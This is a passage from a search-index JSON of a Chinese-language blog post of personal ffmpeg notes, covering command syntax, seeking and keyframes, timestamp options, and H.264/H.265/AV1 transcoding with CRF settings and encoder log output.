an output option (before an output url), stop writing the output after its duration reaches duration.</p> </li> <li> <p><code>-ss position (*input/output*)</code>     When used as an input option (before <code>-i</code>), seeks in this input file to position. </p> <ul> <li>Note that in most formats it is not possible to seek exactly, so <code>ffmpeg</code> will seek to the closest seek point before position. When transcoding and -accurate_seek is enabled (the default), this extra segment between the seek point and position will be decoded and discarded</li> <li>When doing stream copy or when -noaccurate_seek is used, it will be preserved. When used as an output option (before an output url), decodes but discards input until the timestamps reach position.</li> </ul> </li> <li> <p><code>-to position (*input/output*)</code>   Stop writing the output or reading the input at position.</p> </li> <li> <p><code>-filter[:stream_specifier] filtergraph (*output,per-stream*)</code>   Create the filtergraph specified by filtergraph and use it to filter the stream.</p> </li> </ul> <p>filtergraph is a description of the filtergraph to apply to the stream, and must have a single input and a single output of the same type of the stream. In the filtergraph, the input is associated to the label <code>in</code>, and the output to the label <code>out</code>. See the ffmpeg-filters manual for more information about the filtergraph syntax.</p> <ul> <li>Video\u76f8\u5173</li> <li><code>-vn (input/output)</code>     As an input option, blocks all video streams of a file from being filtered or being automatically selected or mapped for any output. See <code>-discard</code> option to disable streams individually.     As an output option, disables video recording i.e. automatic selection or mapping of any video stream. For full manual control see the <code>-map</code> option.</li> <li><code>-vcodec codec (output)</code></li> <li><code>-vf filtergraph (output)</code>     Create the filtergraph specified by filtergraph and use it to filter the stream.</li> </ul>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#quick-start","title":"quick start","text":"<p>\u53c2\u8003\uff1aFFmpeg \u89c6\u9891\u5904\u7406\u5165\u95e8\u6559\u7a0b - \u962e\u4e00\u5cf0\u7684\u7f51\u7edc\u65e5\u5fd7 (ruanyifeng.com)</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u547d\u4ee4\u683c\u5f0f","title":"\u547d\u4ee4\u683c\u5f0f","text":"<pre><code>$ ffmpeg \\\n[\u5168\u5c40\u53c2\u6570] \\\n[\u8f93\u5165\u6587\u4ef6\u53c2\u6570] \\\n-i [\u8f93\u5165\u6587\u4ef6] \\\n[\u8f93\u51fa\u6587\u4ef6\u53c2\u6570] \\\n[\u8f93\u51fa\u6587\u4ef6]\n</code></pre> <p>\u5982\u4e0b\u9762\u7684\u547d\u4ee4\u5c06 mp4 \u6587\u4ef6\u8f6c\u6210 webm \u6587\u4ef6\uff0c\u8fd9\u4e24\u4e2a\u90fd\u662f\u5bb9\u5668\u683c\u5f0f\u3002\u8f93\u5165\u7684 mp4 \u6587\u4ef6\u7684\u97f3\u9891\u7f16\u7801\u683c\u5f0f\u662f aac\uff0c\u89c6\u9891\u7f16\u7801\u683c\u5f0f\u662f H.264\uff1b\u8f93\u51fa\u7684 webm \u6587\u4ef6\u7684\u89c6\u9891\u7f16\u7801\u683c\u5f0f\u662f VP9\uff0c\u97f3\u9891\u683c\u5f0f\u662f Vorbis\u3002</p> <pre><code>$ ffmpeg \\\n-y \\ # \u5168\u5c40\u53c2\u6570\n-c:a libfdk_aac -c:v libx264 \\ # \u8f93\u5165\u6587\u4ef6\u53c2\u6570\n-i input.mp4 \\ # \u8f93\u5165\u6587\u4ef6\n-c:v libvpx-vp9 -c:a libvorbis \\ # \u8f93\u51fa\u6587\u4ef6\u53c2\u6570\noutput.webm # \u8f93\u51fa\u6587\u4ef6\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5e38\u7528\u53c2\u6570","title":"\u5e38\u7528\u53c2\u6570","text":"<pre><code>-c\uff1a\u6307\u5b9a\u7f16\u7801\u5668\n-c copy\uff1a\u76f4\u63a5\u590d\u5236\uff0c\u4e0d\u7ecf\u8fc7\u91cd\u65b0\u7f16\u7801\uff08\u8fd9\u6837\u6bd4\u8f83\u5feb\uff09\n-c:v\uff1a\u6307\u5b9a\u89c6\u9891\u7f16\u7801\u5668\n-c:a\uff1a\u6307\u5b9a\u97f3\u9891\u7f16\u7801\u5668\n-i\uff1a\u6307\u5b9a\u8f93\u5165\u6587\u4ef6\n-an\uff1a\u53bb\u9664\u97f3\u9891\u6d41\n-vn\uff1a \u53bb\u9664\u89c6\u9891\u6d41\n-preset\uff1a\u6307\u5b9a\u8f93\u51fa\u7684\u89c6\u9891\u8d28\u91cf\uff0c\u4f1a\u5f71\u54cd\u6587\u4ef6\u7684\u751f\u6210\u901f\u5ea6\uff0c\u6709\u4ee5\u4e0b\u51e0\u4e2a\u53ef\u7528\u7684\u503c ultrafast, superfast, veryfast, faster, fast, medium, slow, slower, veryslow\u3002\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u67e5\u770b\u652f\u6301\u7684\u7f16\u7801\u5668","title":"\u67e5\u770b\u652f\u6301\u7684\u7f16\u7801\u5668","text":"<pre><code>~ ffmpeg.exe -encoders |grep av1\n V..... libaom-av1           libaom AV1 (codec av1)\n V....D librav1e             librav1e AV1 (codec av1)\n V..... libsvtav1            SVT-AV1(Scalable Video Technology for AV1) encoder (codec av1)\n\n~ ffmpeg.exe -encoders |grep HEVC\n V..... libx265              libx265 H.265 / HEVC (codec hevc)\n V....D hevc_amf             AMD AMF HEVC encoder (codec hevc)\n V....D hevc_mf              HEVC via MediaFoundation (codec hevc)\n\n~ ffmpeg.exe -encoders |grep h264\nV..... libx264              libx264 H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 (codec h264)\n V..... libx264rgb           libx264 H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 RGB (codec h264)\n V..... libopenh264          OpenH264 H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 (codec h264)\n V....D h264_amf             AMD AMF H.264 Encoder (codec h264)\n V....D h264_mf              H264 via MediaFoundation (codec h264)\n V....D h264_nvenc           NVIDIA NVENC H.264 encoder (codec h264)\n V..... h264_qsv             H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 (Intel Quick Sync Video acceleration) (codec h264)\n V..... nvenc                NVIDIA NVENC H.264 encoder (codec h264)\n V..... nvenc_h264           NVIDIA NVENC H.264 encoder (codec h264)\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5fc3\u5f97\u5751","title":"\u5fc3\u5f97(\u5751)","text":"<ul> <li>\u6d41\u590d\u5236\u4e0d\u7528\u8f6c\u7801\u662f\u5f88\u597d\uff0c\u4f46\u662f\u4f1a\u5bfc\u81f4\u5404\u79cd\u95ee\u9898\u3002\u6bd4\u5982seek\u4e0d\u7cbe\u786e\u3001seek\u540e\u89c6\u9891\u548c\u97f3\u9891\u957f\u5ea6\u76f8\u5dee\u51e0\u767ems\u3002\u56e0\u6b64\u526a\u8f91\u89c6\u9891\u6700\u7a33\u59a5\u8d77\u89c1\u8fd8\u662f\u91cd\u65b0\u8f6c\u7801\u4e00\u4e0b</li> <li>\u8f6c\u7801\u65f6crf\u4e00\u5b9a\u8981\u9009\u597d\uff0c\u9ed8\u8ba4\u7684\u7801\u7387\u662f\u5f88\u4f4e\u7684 h265</li> <li>crf 26: 11mbps\uff08B\u7ad9\u8f6c\u6210h264\u5c31\u526910mb\u4e86\uff0c\u4f46\u5b9e\u9645\u6700\u9ad8\u53ef\u8fbe18mb\uff09</li> <li>crf 20: 22281kb</li> <li>crf 16: 34894kb</li> </ul>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5e38\u7528\u547d\u4ee4","title":"\u5e38\u7528\u547d\u4ee4","text":"","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u67e5\u770b\u6587\u4ef6\u5143\u4fe1\u606f","title":"\u67e5\u770b\u6587\u4ef6\u5143\u4fe1\u606f","text":"<pre><code>ffmpeg -i input.mp4 -hide_banner\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u63d0\u53d6\u97f3\u9891","title":"\u63d0\u53d6\u97f3\u9891","text":"<p>\u8f93\u51fa\u6587\u4ef6\u53ef\u4ee5\u9009\u62e9\u4e0d\u540c\u5bb9\u5668\u683c\u5f0f\uff0c\u6839\u636e\u97f3\u9891\u7f16\u7801\u9009\u62e9\u3002\uff08\u5982m4a, mp3\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528mkv\u5b58\u50a8\uff09 <pre><code>$ ffmpeg -i input.mp4 -vn -c:a copy output.aac\n</code></pre></p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u622a\u56fe","title":"\u622a\u56fe","text":"<pre><code>$ ffmpeg -i input.mp4 -ss 00:01:24 -t 00:00:01 output_%3d.jpg\n</code></pre> <p><code>-vframes 1</code>\u6307\u5b9a\u53ea\u622a\u53d6\u4e00\u5e27\uff0c<code>-q:v 2</code>\u8868\u793a\u8f93\u51fa\u7684\u56fe\u7247\u8d28\u91cf\uff0c\u4e00\u822c\u662f1\u52305\u4e4b\u95f4\uff081 \u4e3a\u8d28\u91cf\u6700\u9ad8\uff09\u3002</p> <pre><code>$ ffmpeg -ss 01:23:45 -i input -vframes 1 -q:v 2 output.jpg\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<p>FFmpeg Formats Documentation -fflags\u00a0flags\u662f\u53e6\u5916\u7684\u9009\u9879 - \u2018genpts\u2019\uff1aGenerate missing PTS if DTS is present.</p> <p>video - Does PTS have to start at 0? - Stack Overflow - \u60f3\u8ba9start_pts\u5305\u542b\u5b9e\u9645\u65f6\u95f4\u4fe1\u606f</p> <p>video - ffmpeg setpts apply uniform offset without re-encoding - Stack Overflow - \u4e24\u4e2a\u6d41\uff0c\u77e5\u9053\u7ed3\u5c3e\uff0c\u56e0\u6b64\u53ef\u4ee5\u540c\u6b65 - \u4f7f\u7528setpts filter\u53ef\u4ee5\u505a\u5230\uff0c\u4f46\u662f\u60f3\u8981\u907f\u514d\u8f6c\u7801</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u622a\u53d6seeking\u4f4d\u7f6e","title":"\u622a\u53d6Seeking\u4f4d\u7f6e","text":"<p>\u4e00\u5b9a\u8981\u8bfb\uff1aSeeking \u2013 FFmpeg</p> <p>\u5173\u952e\u5e27\uff08Keyframes\uff09\uff1a\u5728\u89c6\u9891\u7f16\u7801\u4e2d\uff0c\u5173\u952e\u5e27\u662f\u89c6\u9891\u5e8f\u5217\u4e2d\u7684\u7279\u6b8a\u5e27\uff0c\u5b83\u4eec\u662f\u72ec\u7acb\u7684\u3001\u4e0d\u4f9d\u8d56\u4e8e\u5176\u4ed6\u5e27\u7684\u5e27\u3002\u5173\u952e\u5e27\u5305\u542b\u5b8c\u6574\u7684\u56fe\u50cf\u4fe1\u606f\uff0c\u800c\u5176\u4ed6\u5e27\uff08\u5982P\u5e27\u548cB\u5e27\uff09\u5219\u5229\u7528\u5173\u952e\u5e27\u548c/\u6216\u5176\u4ed6\u5e27\u7684\u4fe1\u606f\u8fdb\u884c\u538b\u7f29\u3002 \u5173\u952e\u5e27\u662f\u89c6\u9891\u4e2d\u7684\u91cd\u8981\u53c2\u8003\u70b9\uff0c\u5b83\u4eec\u901a\u5e38\u51fa\u73b0\u5728\u89c6\u9891\u573a\u666f\u53d8\u5316\u6216\u8fd0\u52a8\u53d1\u751f\u7684\u5730\u65b9\u3002\u7531\u4e8e\u5173\u952e\u5e27\u662f\u72ec\u7acb\u7684\uff0c\u89c6\u9891\u64ad\u653e\u5668\u6216\u89e3\u7801\u5668\u53ef\u4ee5\u5728\u4efb\u4f55\u5173\u952e\u5e27\u5904\u5f00\u59cb\u89e3\u7801\uff0c\u800c\u4e0d\u9700\u8981\u4f9d\u8d56\u4e4b\u524d\u7684\u5e27\u3002\u8fd9\u6709\u52a9\u4e8e\u5feb\u901f\u5b9a\u4f4d\u548c\u968f\u673a\u8bbf\u95ee\u89c6\u9891\u3002</p> <p>PTS\uff08Presentation Timestamp\uff09\uff1a PTS\u662f\u4e00\u4e2a\u65f6\u95f4\u6233\uff0c\u8868\u793a\u89c6\u9891\u6216\u97f3\u9891\u5e27\u5728\u64ad\u653e\u65f6\u5e94\u8be5\u5448\u73b0\u7684\u65f6\u95f4\u3002PTS\u7528\u4e8e\u786e\u5b9a\u5e27\u4f55\u65f6\u5e94\u8be5\u5728\u64ad\u653e\u65f6\u95f4\u8f74\u4e0a\u663e\u793a\u6216\u64ad\u653e\u3002</p> <p>GOP\uff08Group of Pictures\uff09\uff1aGOP\u662f\u89c6\u9891\u5e8f\u5217\u4e2d\u7684\u4e00\u7ec4\u5e27\uff0c\u5b83\u5305\u542b\u4e00\u4e2a\u5173\u952e\u5e27\uff08I\u5e27\uff09\u548c\u4e00\u4e9b\u540e\u7eed\u5e27\uff0c\u5305\u62ec\u9884\u6d4b\u5e27\uff08P\u5e27\uff09\u548c\u53cc\u5411\u9884\u6d4b\u5e27\uff08B\u5e27\uff09\u3002GOP\u7684\u7ed3\u6784\u6709\u52a9\u4e8e\u89c6\u9891\u538b\u7f29\u548c\u89e3\u7801\u3002 \u5178\u578b\u7684GOP\u7ed3\u6784\u53ef\u80fd\u662f\"IBBPBBPBBPBB\"\uff0c\u5176\u4e2d\"I\"\u662f\u5173\u952e\u5e27\uff0c\"B\"\u662f\u53cc\u5411\u9884\u6d4b\u5e27\uff0c\"P\"\u662f\u9884\u6d4b\u5e27\u3002\u5173\u952e\u5e27\u59cb\u7ec8\u662fGOP\u7684\u7b2c\u4e00\u4e2a\u5e27\u3002</p> <p>\u5173\u952e\u5e27\u548cGOP\u7684\u5173\u7cfb\uff1a \u5173\u952e\u5e27\u662fGOP\u7684\u8d77\u70b9\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0\u7684\u7f16\u7801\u7ec4\uff0c\u5176\u540e\u8ddf\u968f\u4e00\u7cfb\u5217\u4f9d\u8d56\u4e8e\u5b83\u7684\u9884\u6d4b\u5e27\u548c\u53cc\u5411\u9884\u6d4b\u5e27\u3002\u6574\u4e2aGOP\u7684\u7ed3\u6784\u6709\u52a9\u4e8e\u5728\u89c6\u9891\u7f16\u7801\u4e2d\u5b9e\u73b0\u9ad8\u538b\u7f29\u6bd4\uff0c\u56e0\u4e3a\u9884\u6d4b\u5e27\u548c\u53cc\u5411\u9884\u6d4b\u5e27\u53ef\u4ee5\u5229\u7528\u5173\u952e\u5e27\u7684\u4fe1\u606f\u8fdb\u884c\u5dee\u5f02\u7f16\u7801\uff0c\u800c\u4e0d\u5fc5\u643a\u5e26\u5b8c\u6574\u7684\u56fe\u50cf\u4fe1\u606f\u3002 \u5728\u89c6\u9891\u6d41\u4e2d\uff0c\u5173\u952e\u5e27\u7684\u9009\u62e9\u548cGOP\u7684\u8bbe\u7f6e\u5bf9\u4e8e\u89c6\u9891\u7684\u8d28\u91cf\u3001\u538b\u7f29\u6548\u7387\u548c\u5feb\u901f\u5b9a\u4f4d\u80fd\u529b\u90fd\u5177\u6709\u91cd\u8981\u5f71\u54cd\u3002\u4e0d\u540c\u7684\u5e94\u7528\u548c\u4f7f\u7528\u573a\u666f\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u5173\u952e\u5e27\u95f4\u9694\u548cGOP\u7ed3\u6784\u6765\u5e73\u8861\u538b\u7f29\u6548\u7387\u548c\u89e3\u7801\u6027\u80fd\u3002</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u67e5\u770b\u5173\u952e\u5e27\u65b9\u6cd5","title":"\u67e5\u770b\u5173\u952e\u5e27\u65b9\u6cd5","text":"<pre><code>ffprobe -select_streams v -show_frames -show_entries frame=pict_type,pkt_pts_time bbb_sunflower_1080p_30fps_normal.mp4 &gt; log\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#input-seeking","title":"input seeking","text":"<p>-ss \u00a0position\u00a0(input/output)</p> <p>When used as an input option (before\u00a0<code>-i</code>), seeks in this input file to\u00a0position. Note that in most formats it is not possible to seek exactly, so\u00a0<code>ffmpeg</code>\u00a0will seek to the closest seek point before\u00a0position.</p> <ul> <li>\u7b80\u5355\u7406\u89e3\u4e3aseek\u5230I\u5e27\u3002</li> <li>\u8f6c\u7801\u65f6\uff1aWhen transcoding and\u00a0-accurate_seek\u00a0is enabled (the default), this extra segment between the seek point and\u00a0position\u00a0will be decoded and discarded</li> <li>copy\u65f6\uff1aWhen doing stream copy or when\u00a0-noaccurate_seek\u00a0is used, it will be preserved.</li> <li>\u7531\u4e8e\u4e0d\u80fd\u7f16\u89e3\u7801\uff0c\u6240\u4ee5\u5b9e\u9645seek\u4f4d\u7f6e\u5fc5\u987b\u5bf9\u5e94I\u5e27\uff0c\u56e0\u6b64seek\u4f4d\u7f6e\u5b9e\u9645\u5728pos\u6700\u524d\u7684\u4e00\u4e2aI\u5e27\uff0c\u7136\u540e\u5c06ts\u7f6e\u4e3a0\uff1f</li> </ul>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5b9e\u9a8c","title":"\u5b9e\u9a8c","text":"<pre><code>ffmpeg -i bbb_sunflower_1080p_30fps_normal.mkv -t 10 ref/ref_%04d.png\n\nf421d45d1b8b491dc36a564c01246ef8  i_ss_2-noacc.png\n468a10a80c838526709d4d35abe7af3a  i_ss_2.png\n\n(base) fyyuan@icarus4 \u279c  test cat ref/log2|grep f421d45d1b8b491dc36a564c01246ef8\nf421d45d1b8b491dc36a564c01246ef8  ref_0061.png\n(base) fyyuan@icarus4 \u279c  test cat ref/log2|grep 468a10a80c838526709d4d35abe7af3a\n468a10a80c838526709d4d35abe7af3a  ref_0059.png\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#output-seeking","title":"output seeking","text":"<p>When used as an output option (before an output url), decodes but discards input until the timestamps reach\u00a0position. - \u7531\u4e8einput\u5df2\u7ecf\u88ab\u89e3\u7801\u4e86\uff0c\u56e0\u6b64\u6bcf\u5e27\u7684timestamp\u53ef\u4ee5\u83b7\u5f97\uff0cseek\u5230\u6307\u5b9a\u4f4d\u7f6e\u524d\u7684frame\u3002 - Here, the input will be decoded (and discarded) until it reaches the position given by\u00a0<code>-ss</code>. This will be done\u00a0very slowly, frame by frame. - As of FFmpeg 2.1, the main advantage is that when applying filters to the output stream, the timestamps aren't reset prior to filtering (i.e. when\u00a0\u200bburning subtitles into a video, you don't need to modify the subtitle timestamps),</p> <pre><code>ffprobe -select_streams v -show_frames -show_entries frame=pict_type,pkt_pts_time src.mkv\n</code></pre> <pre><code>[FRAME]\npkt_pts_time=0.613000\npict_type=I\n[/FRAME]\n[FRAME]\npkt_pts_time=0.630000\npict_type=B\n[/FRAME]\n...\n[FRAME]\npkt_pts_time=1.130000\npict_type=B\n[/FRAME]\n[FRAME]\npkt_pts_time=1.147000\npict_type=I\n[/FRAME]\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u4e00\u4e9b\u9009\u9879","title":"\u4e00\u4e9b\u9009\u9879","text":"<p>-copyts</p> <p>Do not process input timestamps, but keep their values without trying to sanitize them. In particular, do not remove the initial start time offset value. Note that, depending on the\u00a0vsync\u00a0option or on specific muxer processing (e.g. in case the format option\u00a0avoid_negative_ts\u00a0is enabled) the output timestamps may mismatch with the input timestamps even when this option is selected.</p> <p>-start_at_zero</p> <p>When used with\u00a0copyts, shift input timestamps so they start at zero. This means that using e.g.\u00a0<code>-ss 50</code>\u00a0will make output timestamps start at 50 seconds, regardless of what timestamp the input file started at.</p> <p>-avoid_negative_ts\u00a0integer\u00a0(output)</p> <p>Possible values: \u2018make_non_negative\u2019 Shift timestamps to make them non-negative. Also note that this affects only leading negative timestamps, and not non-monotonic negative timestamps.</p> <p>\u2018make_zero\u2019 Shift timestamps so that the first timestamp is 0.</p> <p>\u2018auto (default)\u2019 Enables shifting when required by the target format.</p> <p>\u2018disabled\u2019 Disables shifting of timestamp.</p> <p>When shifting is enabled, all output timestamps are shifted by the same amount. Audio, video, and subtitles desynching and relative timestamp differences are preserved compared to how they would have been without shifting.</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u8f6c\u7801","title":"\u8f6c\u7801","text":"","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u97f3\u9891","title":"\u97f3\u9891","text":"<pre><code>fyyuan@icarus4 \u279c  Media ffmpeg -vn -i src.mkv -c:a aac -b:a 256k audio.mp3\nStream mapping:\n  Stream #0:1 -&gt; #0:0 (aac_latm (native) -&gt; aac (native))\nPress [q] to stop, [?] for help\n[mp3 @ 0x564c9fc61340] Invalid audio stream. Exactly one MP3 audio stream is required.\nCould not write header for output file #0 (incorrect codec parameters ?): Invalid argument\nError initializing output stream 0:0 --\n[aac @ 0x564c9fc60900] Qavg: nan\nConversion failed!\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#h264","title":"h264","text":"<p>Encode/H.264 \u2013 FFmpeg</p> <p>\u4e24\u79cd\u6a21\u5f0f - CRF\uff1a\u4e0d\u5173\u5fc3\u6587\u4ef6\u5927\u5c0f - 2pass: \u5bf9\u6587\u4ef6\u5927\u5c0f\u6709\u8981\u6c42\u7684\u573a\u666f\uff0c\u6bd4\u5982streaming</p> <pre><code>ffmpeg -i input -c:v libx264 -preset slow -crf 22 -c:a copy output.mkv\n</code></pre> <p>\u6211\u4f7f\u7528\u8fd9\u6bb5\u53c2\u6570\u8f6c\u7801h265\u7684\u7537\u5b50\u9ad8\u4e2d\u751fS01E01\uff0c\u4ece514-&gt;320MB\uff0c\u7ed3\u679c\u8d28\u91cf\u5f88\u5dee <pre><code>ffmpeg.exe -i video.mkv -map 0 -c:v libx264 -crf 18 out-h264-cpu.mkv\n</code></pre></p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#crf","title":"CRF","text":"<pre><code>ffmpeg -i INPUT -c:v libx264 -crf 22 -preset slow -tune film -profile:v high10 -c:a aac -b:a 320k  OUTPUT\n\n\nframe=31195 fps= 52 q=-1.0 Lsize= 1789175kB time=00:08:41.00 bitrate=28132.0kbits/s speed=0.863x\nvideo:1768370kB audio:20388kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.023303%\n[libx264 @ 0x5600dc3637c0] frame I:149   Avg QP:30.35  size:340646\n[libx264 @ 0x5600dc3637c0] frame P:8748  Avg QP:33.31  size:125510\n[libx264 @ 0x5600dc3637c0] frame B:22298 Avg QP:36.79  size: 29693\n[libx264 @ 0x5600dc3637c0] consecutive B-frames:  1.9%  7.6%  2.5% 88.0%\n[libx264 @ 0x5600dc3637c0] mb I  I16..4: 35.7% 56.8%  7.6%\n[libx264 @ 0x5600dc3637c0] mb P  I16..4: 19.4% 13.1%  0.6%  P16..4: 37.2%  7.4%  3.3%  0.0%  0.0%    skip:18.9%\n[libx264 @ 0x5600dc3637c0] mb B  I16..4:  1.0%  0.9%  0.0%  B16..8: 28.7%  2.2%  0.3%  direct: 2.0%  skip:64.8%  L0:39.9% L1:52.9% BI: 7.1%\n[libx264 @ 0x5600dc3637c0] 8x8 transform intra:41.3% inter:87.3%\n[libx264 @ 0x5600dc3637c0] direct mvs  spatial:99.8% temporal:0.2%\n[libx264 @ 0x5600dc3637c0] coded y,uvDC,uvAC intra: 22.8% 49.0% 8.8% inter: 7.7% 12.4% 0.6%\n[libx264 @ 0x5600dc3637c0] i16 v,h,dc,p: 20% 24%  8% 49%\n[libx264 @ 0x5600dc3637c0] i8 v,h,dc,ddl,ddr,vr,hd,vl,hu: 12% 13% 13%  7% 11% 11% 13%  9% 11%\n[libx264 @ 0x5600dc3637c0] i4 v,h,dc,ddl,ddr,vr,hd,vl,hu: 13% 15%  8%  7% 13% 11% 13%  8% 12%\n[libx264 @ 0x5600dc3637c0] i8c dc,h,v,p: 45% 24% 15% 16%\n[libx264 @ 0x5600dc3637c0] Weighted P-Frames: Y:1.8% UV:1.0%\n[libx264 @ 0x5600dc3637c0] ref P L0: 74.3% 16.2%  5.7%  3.7%  0.1%  0.0%\n[libx264 @ 0x5600dc3637c0] ref B L0: 90.6%  6.6%  2.0%  0.8%\n[libx264 @ 0x5600dc3637c0] ref B L1: 98.3%  1.7%\n[libx264 @ 0x5600dc3637c0] kb/s:27827.21\n[aac @ 0x5600dc395700] Qavg: 174.559\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#h265","title":"h265","text":"<p>Encode/H.265 \u2013 FFmpeg</p> <ul> <li> <p>Choose a CRF. CRF affects the quality. The default is 28, and it should visually correspond to libx264 video at CRF 23, but result in about half the file size. CRF works just like in x264, so choose the highest value that provides an acceptable quality.</p> </li> <li> <p>Choose a preset. The default is <code>medium</code>. The preset determines compression efficiency and therefore affects encoding speed. Valid presets are <code>ultrafast</code>, <code>superfast</code>, <code>veryfast</code>, <code>faster</code>, <code>fast</code>, <code>medium</code>, <code>slow</code>, <code>slower</code>, <code>veryslow</code>, and <code>placebo</code>. Use the slowest preset you have patience for. Ignore <code>placebo</code> as it provides insignificant returns for a significant increase in encoding time.</p> </li> <li> <p>Choose a tune (optional). By default, this is disabled, and it is generally not required to set a tune option. x265 supports the following <code>-tune</code> options: <code>psnr</code>, <code>ssim</code>, <code>grain</code>, <code>zerolatency</code>, <code>fastdecode</code>. They are explained in the H.264 guide.</p> </li> </ul>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#crf_1","title":"CRF","text":"<p>\u76f4\u63a5\u8f6c\u7801\uff0c\u4ecd\u4f7f\u7528\u4e86\u539f\u672c\u768459.94fps <pre><code>ffmpeg -i INPUT -c:v libx265 -crf 26 -preset slow -c:a aac -b:a 320k OUTPUT\n\nframe=31195 fps= 12 q=35.8 Lsize=  709168kB time=00:08:41.00 bitrate=11150.6kbits/s speed=0.195x\nvideo:688379kB audio:20388kB subtitle:0kB other streams:0kB global headers:2kB muxing overhead: 0.056575%\nx265 [info]: frame I:    132, Avg QP:27.54  kb/s: 60301.51\nx265 [info]: frame P:   7805, Avg QP:29.13  kb/s: 28855.09\nx265 [info]: frame B:  23258, Avg QP:34.69  kb/s: 4505.13\nx265 [info]: Weighted P-Frames: Y:1.7% UV:1.4%\nx265 [info]: consecutive B-frames: 1.0% 2.5% 2.3% 91.0% 3.3%\n\nencoded 31195 frames in 2677.46s (11.65 fps), 10833.60 kb/s, Avg QP:33.27\n[aac @ 0x55d67964f4c0] Qavg: 174.559\n</code></pre></p> <p>\u8bbe\u7f6e\u5e27\u738760fps <pre><code>ffmpeg -i INPUT -c:v libx265 -crf 26 -preset slow -r 60 -c:a aac -b:a 320k OUTPUT\n\n\nframe=31195 fps=8.3 q=36.0 Lsize=  708843kB time=00:08:41.00 bitrate=11145.6kbits/s speed=0.139x\nvideo:688054kB audio:20388kB subtitle:0kB other streams:0kB global headers:2kB muxing overhead: 0.056600%\nx265 [info]: frame I:    132, Avg QP:27.54  kb/s: 60361.57\nx265 [info]: frame P:   7805, Avg QP:29.14  kb/s: 28870.71\nx265 [info]: frame B:  23258, Avg QP:34.70  kb/s: 4507.21\nx265 [info]: Weighted P-Frames: Y:1.7% UV:1.4%\nx265 [info]: consecutive B-frames: 1.0% 2.5% 2.3% 91.0% 3.3%\n\nencoded 31195 frames in 3751.69s (8.31 fps), 10839.31 kb/s, Avg QP:33.27\n[aac @ 0x56079a852080] Qavg: 174.559\n</code></pre></p> <p>src(59.94)   1080p(30)   2160p(59.94) 41.149  40.566  40.539 41.002  41.045  41.045</p> <p>60         59.94 41.171   41.175 41.023   41.023</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#av1","title":"av1","text":"<p>Encode/AV1 \u2013 FFmpeg</p> <p>Constant Quality\uff1a</p> <p>libaom-av1 has a constant quality (CQ) mode (like CRF in x264 and x265) which will ensure that every frame gets the number of bits it deserves to achieve a certain (perceptual) quality level, rather than encoding each frame to meet a bit rate target. This results in better overall quality. If you do not need to achieve a fixed target file size, this should be your method of choice.</p> <pre><code>ffmpeg -i input.mp4 -c:v libaom-av1 -crf 30 -b:v 0 av1_test.mkv\n</code></pre> <p>\u6162\u5230\u4e0d\u53ef\u7528\uff01\uff01\uff01</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u8c03\u8282\u5e27\u6570","title":"\u8c03\u8282\u5e27\u6570","text":"<p>ffmpeg - Best way to convert a 59.94fps video to 29.97? - Stack Overflow</p> <p>[FFmpeg-user] framerate conversion with sync audio (narkive.com) 